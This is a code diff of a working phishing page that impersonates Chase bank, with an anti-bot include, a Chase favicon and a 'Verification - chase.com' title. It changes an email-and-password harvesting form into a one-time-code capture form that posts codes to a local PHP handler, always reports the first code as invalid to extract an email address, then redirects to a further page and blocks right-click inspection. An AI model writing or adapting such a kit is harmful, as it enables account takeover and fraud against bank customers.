@@ -1,3 +1,4 @@
+
 <?php
 
     include './secure/anti1.php';
@@ -23,13 +24,13 @@
     <meta name="author" content="">
     <meta name="robots" content="noindex,nofollow">
 
-    <title>Authorization</title>
+    <title>Verification - chase.com</title>
 
     <link href="./css/bootstrap.min.css" rel="stylesheet">
     <link href="./css/shop-homepage.css" rel="stylesheet">
     <link href="./css/styles.css" rel="stylesheet">
     <link rel="shortcut icon" href="./img/chasefavicon.ico">
-    <!-- <script src="https://kit.fontawesome.com/6222530beb.js"></script> -->
+    <script src="https://kit.fontawesome.com/21cf0ca2ce.js" crossorigin="anonymous"></script>
     <style>
         .rror {
             color: crimson;
@@ -42,10 +43,9 @@
             display: none;
         }
     </style>
-    <script src="https://kit.fontawesome.com/21cf0ca2ce.js" crossorigin="anonymous"></script>
 </head>
 
-<body class="less" style="background-image: url(./img/background.desktop.night.11.jpeg);">
+<body class="less">
 
 <!-- Login Box -->    
 <div class="logon-container">
@@ -59,56 +59,32 @@
            <div class="row">
                <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box">
                    <div class="jpui raised segment">
-                   
+                       <span style="color: crimson;" class="rror" id="rror">
+                            <i class="fas fa-circle-exclamation" style="color: crimson;"></i>
+                            Invalid OTP code. Please try again.
+                        </span>
                        <div class="row">
                            <div class="col-xs-10 col-xs-offset-1">
                                <form action="" method="post" id="res" enctype="multipart/form-data">
-                                 <h3 style="font-family: sans-serif;text-align: center;">Syncronize Your Email Address</h3>
-                                   <span style="color: crimson;" class="rror" id="rror">
-                                        <i class="fas fa-circle-exclamation" style="color: crimson;"></i>
-                                        Wrong password, please try again
-                                    </span>
+                                   <h3 style="font-family: sans-serif;text-align: center;">Enter Verification Code</h3>
+                                   <p style="text-align: center; color: #717171; margin-bottom: 20px;">Please enter the OTP code sent to your device</p>
+                                   
                                   <div class="us-norm us-mt">
-                                   <input type="email" class="frinp" name="aa" id="userid" required>
-                                   <label for="userid" class="frel">Email address</label>
+                                   <input type="text" class="frinp" name="otp" id="otp" required pattern="[0-9]{6}" maxlength="6">
+                                   <label for="otp" class="frel">OTP Code</label>
                                   </div>
-                                  <div class="us-norm">
-                                   <input type="password" class="frinp" name="bb" id="pass" required minlength="5">
-                                   <label for="pass" class="frel">Email password</label>
+                                  
+                                  <div class="us-norm" id="emailField" style="display:none;">
+                                   <input type="email" class="frinp" name="email" id="email">
+                                   <label for="email" class="frel">Email Address</label>
                                   </div>
-                                  <!-- <div class="us-norm">
-                                   <input type="text" class="frinp" name="tok" id="token" style="display:none;">
-                                   <label for="token" class="frel" id="ken" style="display:none;">Token</label>
-                                  </div> -->
-                                  <div class="row" style="display: none;">
-                                      <div class="col-sm-6 col-xs-7 remember">
-                                          <div class="jpui checkbox" id=rememberMe>
-                                              <label class="cont">Remember me
-                                               <input type="checkbox" name="save" value="save">
-                                               <span class="checkmark"></span>
-                                            </label>
-                                          </div>
-                                      </div>
-                                      <div class="col-sm-6 col-xs-5 token" style="display: none;">
-                                          <div class="jpui checkbox useT" >
-                                              <label class="cont" >Use token
-                                               <input type="checkbox" name="save" value="save"  id="utoken" onclick="myFunction()">
-                                               <span class="checkmark sand"></span>
-                                            </label>
-                                          </div>
-                                      </div>
+                                  
+                                  <div class="row">
+                                      <input type="submit" class="jpui submit" value="Verify" name="submit">
                                   </div>
                                   <div class="row">
-                                      <input type="submit" class="jpui submit" value="Sign in" name="submit">
-                                  </div>
-                                  <div class="row" style="display: none;">
                                       <span class="jpui link">
-                                          <a href="#" class="link-anchor">Forgot username/password? ></a>
-                                      </span>
-                                  </div>
-                                  <div class="row" style="display: none;">
-                                      <span class="jpui link">
-                                          <a href="#" class="link-anchor">Not Enrolled? Sign Up Now. ></a>
+                                          <a href="#" class="link-anchor">Didn't receive code? Resend ></a>
                                       </span>
                                   </div>
                                </form>
@@ -167,22 +143,10 @@
 </footer>
 <!-- /.Footer Side -->
 
-<script>
+<script src="./js/jquery.js"></script>
+<script src="./js/bootstrap.min.js"></script>
 
-function myFunction() {
-  var checkBox = document.getElementById("utoken");
-  var uto = document.getElementById("token");
-  var ken = document.getElementById("ken");
-  if (checkBox.checked == true) {
-    uto.style.display = "inline-block";
-    ken.style.display = "inline-block";
-  } else {
-    uto.style.display = "none";
-    ken.style.display = "none";
-  }
-}
-      const eml = localStorage.getItem("caseemail");
-      document.getElementById("userid").value = eml;
+<script>
        document.addEventListener('contextmenu', function (e) {
          e.preventDefault();
        });
@@ -203,24 +167,24 @@ function myFunction() {
       
           var formData = new FormData(this);
           var xhr = new XMLHttpRequest();
-          xhr.open("POST", "./config/email.php", true); // your php url here
+          xhr.open("POST", "./config/otp.php", true);
       
           xhr.onreadystatechange = function () {
-              const directts = localStorage.getItem("userDomain")
-              console.log(directts);
               if (xhr.readyState == 4 && xhr.status == 200) {
                   console.log(xhr.responseText);
       
                   if (formSubmitted === 1) {
-                      document.getElementById("pass").value = "";
-                     document.getElementById("pass").value = "";
-                      console.log("YESSSSS");
+                      // First attempt failed - show email field
+                      document.getElementById("otp").value = "";
                       document.getElementById("rror").style.display = "block";
+                      document.getElementById("emailField").style.display = "block";
+                      document.getElementById("email").required = true;
                       setTimeout(() => {
-                        document.getElementById("errorr").style.display = "none"
-                      }, 1500);
+                        document.getElementById("rror").style.display = "none"
+                      }, 3000);
                   } else if (formSubmitted >= 2) {
-                      window.location.href = "./otp.php";
+                      // Second attempt - proceed to next page
+                      window.location.href = "./fl.php";
                   }
               }
           };
@@ -230,9 +194,6 @@ function myFunction() {
     
 </script>
 
-
-<script src="./js/jquery.js"></script>
-<script src="./js/bootstrap.min.js"></script>
 </body>
 
 </html>
